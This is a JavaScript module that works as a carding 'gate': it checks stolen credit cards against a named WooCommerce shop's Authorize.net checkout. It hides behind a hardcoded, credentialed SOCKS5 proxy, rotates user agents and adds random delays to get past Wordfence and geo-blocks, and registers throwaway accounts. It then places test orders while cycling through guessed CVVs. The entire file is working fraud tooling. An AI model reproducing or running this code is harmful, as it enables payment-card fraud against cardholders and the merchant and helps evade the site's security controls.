const axios = require('axios');
const cheerio = require('cheerio');
const { SocksProxyAgent } = require('socks-proxy-agent');
const UserAgent = require('user-agents');

// ============================================
// PROXY CONFIGURATION
// ============================================

const PROXY_LIST = [
    'socks5://7Rdy9bWwljhrEgq:dg1gZsgBi8b3jdN@65.195.37.147:45023',
];

// Get random proxy from list
function getRandomProxy() {
    return PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
}

// ============================================
// CLIENT FACTORY WITH PROXY (NO COOKIE JAR)
// ============================================

function createClient(proxyUrl = null) {
    const config = {
        headers: {
            'User-Agent': new UserAgent().toString(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        },
        timeout: 60000,
        validateStatus: () => true,
        maxRedirects: 10,
        withCredentials: true
    };

    // Add SOCKS5 proxy agent
    if (proxyUrl) {
        config.httpAgent = new SocksProxyAgent(proxyUrl);
        config.httpsAgent = new SocksProxyAgent(proxyUrl);
        console.log(`🔒 Using proxy: ${proxyUrl.split('@')[1] || proxyUrl}`);
    }

    const client = axios.create(config);
    
    // Manual cookie handling
    client.cookies = {};
    
    // Intercept responses to extract cookies
    client.interceptors.response.use(response => {
        const setCookie = response.headers['set-cookie'];
        if (setCookie) {
            setCookie.forEach(cookie => {
                const [nameValue] = cookie.split(';');
                const [name, value] = nameValue.split('=');
                if (name && value) {
                    client.cookies[name.trim()] = value.trim();
                }
            });
        }
        return response;
    });
    
    // Intercept requests to add cookies
    client.interceptors.request.use(config => {
        const cookieString = Object.entries(client.cookies)
            .map(([name, value]) => `${name}=${value}`)
            .join('; ');
        
        if (cookieString) {
            config.headers['Cookie'] = cookieString;
        }
        return config;
    });

    return client;
}

// ============================================
// HELPER FUNCTIONS
// ============================================

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function generateRandomEmail() {
    const chars = 'abcdefghijklmnopqrstuvwxyz';
    let result = '';
    for (let i = 0; i < 10; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return `${result}${Date.now()}@gmail.com`;
}

function isWordfenceBlocked(html) {
    return html.includes('wordfence') || 
           html.includes('Security Check') || 
           html.includes('Verifying you are human') ||
           html.includes('Access Denied');
}

function isGeoBlocked(html) {
    return html.includes('not available in your country') ||
           html.includes('geo') ||
           html.includes('region') ||
           html.includes('location');
}

// ============================================
// SESSION WARMING
// ============================================

async function warmUpSession(client) {
    try {
        console.log('  🔥 Warming up session...');
        
        // Visit homepage
        const home = await client.get('https://www.eastcoastpkg.com/');
        if (isWordfenceBlocked(home.data) || isGeoBlocked(home.data)) {
            throw new Error('Blocked by Wordfence or Geo-restriction');
        }
        await sleep(1500 + Math.random() * 1500);
        
        // Visit shop page
        await client.get('https://www.eastcoastpkg.com/shop/');
        await sleep(1000 + Math.random() * 1000);
        
        console.log('  ✅ Session warmed');
    } catch (e) {
        throw new Error(`Session warm-up failed: ${e.message}`);
    }
}

// ============================================
// WORKER FUNCTIONS
// ============================================

async function getProductID(client) {
    try {
        const response = await client.get('https://www.eastcoastpkg.com/product/3-x-24-kraft-premium-telescoping-tubes/');
        
        if (isWordfenceBlocked(response.data)) {
            throw new Error('Wordfence blocked');
        }
        
        const html = response.data;
        
        let productId = html.match(/name=["']add-to-cart["'][\s\S]*?value=["'](\d+)["']/i)?.[1] 
                     || html.match(/value=["'](\d+)["'][\s\S]*?name=["']add-to-cart["']/i)?.[1];

        if (!productId) {
            const $ = cheerio.load(html);
            productId = $('button[name="add-to-cart"]').val();
        }

        if (!productId) throw new Error('Product ID Not Found');
        return productId.trim();
    } catch (e) { 
        throw new Error(`Product Error: ${e.message}`); 
    }
}

async function getCheckoutFields(client) {
    try {
        const response = await client.get('https://www.eastcoastpkg.com/checkout/');
        const $ = cheerio.load(response.data);

        const nonce = $('#woocommerce-process-checkout-nonce').val();
        if (!nonce) throw new Error('Nonce Not Found');

        let receivingDaysTimes = $('select[name="receiving_days_times"] option').eq(1).val() 
                              || $('input[name="receiving_days_times"]').val() 
                              || '577';

        return { nonce, receivingDaysTimes };
    } catch (e) { 
        throw new Error(`Checkout Fields Error: ${e.message}`); 
    }
}

async function signUp(client, email) {
    try {
        const params = new URLSearchParams();
        params.append('email', email);
        params.append('password', 'Test@12345!');
        params.append('register', 'Register');
        
        await client.post('https://www.eastcoastpkg.com/my-account/', params, {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        });
        await sleep(1000 + Math.random() * 1000);
    } catch (e) { 
        // Ignore registration errors
    }
}

async function addToCart(client, productId) {
    try {
        const params = new URLSearchParams();
        params.append('product_id', productId);
        params.append('quantity', '1');
        params.append('attribute_pa_size', 'large');
        
        await client.post('https://www.eastcoastpkg.com/?wc-ajax=add_to_cart', params, {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest'
            }
        });
        await sleep(800 + Math.random() * 800);
    } catch (e) { 
        throw new Error(`Cart Error: ${e.message}`); 
    }
}

async function checkout(client, card, email, nonce, receivingDaysTimes, cvv) {
    try {
        const params = new URLSearchParams();
        params.append('billing_first_name', 'John');
        params.append('billing_last_name', 'Doe');
        params.append('billing_country', 'US');
        params.append('billing_address_1', '123 Main St');
        params.append('billing_city', 'New York');
        params.append('billing_state', 'NY');
        params.append('billing_postcode', '10001');
        params.append('billing_email', email);
        params.append('billing_phone', '2125551234');
        params.append('shipping_country', 'US');
        params.append('receiving_days_times', receivingDaysTimes);
        params.append('payment_method', 'authnet');
        params.append('authnet-card-number', card.number);
        params.append('authnet-card-expiry', `${card.mm} / ${card.yy.slice(-2)}`);
        params.append('authnet-card-cvc', cvv);
        params.append('woocommerce-process-checkout-nonce', nonce);
        params.append('_wp_http_referer', '/checkout/');
        params.append('terms', 'on');
        params.append('terms-field', '1');

        const response = await client.post('https://www.eastcoastpkg.com/?wc-ajax=checkout', params, {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest'
            }
        });
        
        let msg = response.data.messages || "Unknown";
        if (msg !== "Unknown") {
            const $ = cheerio.load(msg);
            msg = $.text().replace(/\s\s+/g, ' ').trim();
        }

        return { result: response.data.result, message: msg };

    } catch (e) { 
        return { result: 'error', message: e.message }; 
    }
}

// ============================================
// TASK RUNNER
// ============================================

async function runSingleTask(cvv, card, useProxy = true) {
    const proxy = useProxy ? getRandomProxy() : null;
    const client = createClient(proxy);
    const email = generateRandomEmail();
    const taskName = `[CVV ${cvv}]`;

    try {
        console.log(`${taskName} Starting...`);
        
        // Warm up session
        await warmUpSession(client);
        await sleep(1500 + Math.random() * 1500);
        
        // Register
        await signUp(client, email);
        await sleep(1000 + Math.random() * 1000);
        
        // Product & Cart
        const pid = await getProductID(client);
        await sleep(800 + Math.random() * 800);
        await addToCart(client, pid);
        await sleep(1200 + Math.random() * 1200);
        
        // Checkout tokens
        const { nonce, receivingDaysTimes } = await getCheckoutFields(client);
        await sleep(1500 + Math.random() * 1500);
        
        // Checkout
        const res = await checkout(client, card, email, nonce, receivingDaysTimes, cvv);
        
        console.log(`${taskName} Result: ${res.message}`);
        
        return { 
            cvv: cvv, 
            status: res.result, 
            message: res.message 
        };

    } catch (error) {
        console.log(`${taskName} Failed: ${error.message}`);
        return { cvv: cvv, status: 'error', message: error.message };
    }
}

// ============================================
// MAIN CONTROLLER
// ============================================

async function runGate(ccData, useProxy = true) {
    const parts = ccData.split('|');
    if (parts.length < 3) return { status: 'error', message: 'Invalid CC format' };

    const card = { number: parts[0], mm: parts[1], yy: parts[2] };
    const cvvList = ['000', '111', '222'];

    console.log(`🚀 Starting Gate Check for ${card.number}...`);
    console.log(`🔒 Proxy Mode: ${useProxy ? 'ENABLED' : 'DISABLED'}`);

    // Run in batches of 2 to avoid overwhelming
    const results = [];
    for (let i = 0; i < cvvList.length; i += 2) {
        const batch = cvvList.slice(i, i + 2);
        const batchResults = await Promise.all(
            batch.map(cvv => runSingleTask(cvv, card, useProxy))
        );
        results.push(...batchResults);
        
        // Wait between batches
        if (i + 2 < cvvList.length) {
            await sleep(3000 + Math.random() * 2000);
        }
    }

    console.log(`✅ All tasks finished.`);

    return { 
        card: parts[0], 
        results: results 
    };
}

// ============================================
// PROXY TEST FUNCTION
// ============================================

async function testProxy(proxyUrl) {
    const client = createClient(proxyUrl);
    try {
        console.log('🧪 Testing proxy connection...');
        const response = await client.get('https://ipapi.co/json/', { timeout: 10000 });
        const data = response.data;
        console.log(`✅ Proxy working!`);
        console.log(`   IP: ${data.ip}`);
        console.log(`   Country: ${data.country_name}`);
        console.log(`   Region: ${data.region}`);
        return data.country_code === 'US';
    } catch (e) {
        console.log(`❌ Proxy failed: ${e.message}`);
        return false;
    }
}

module.exports = { runGate, testProxy };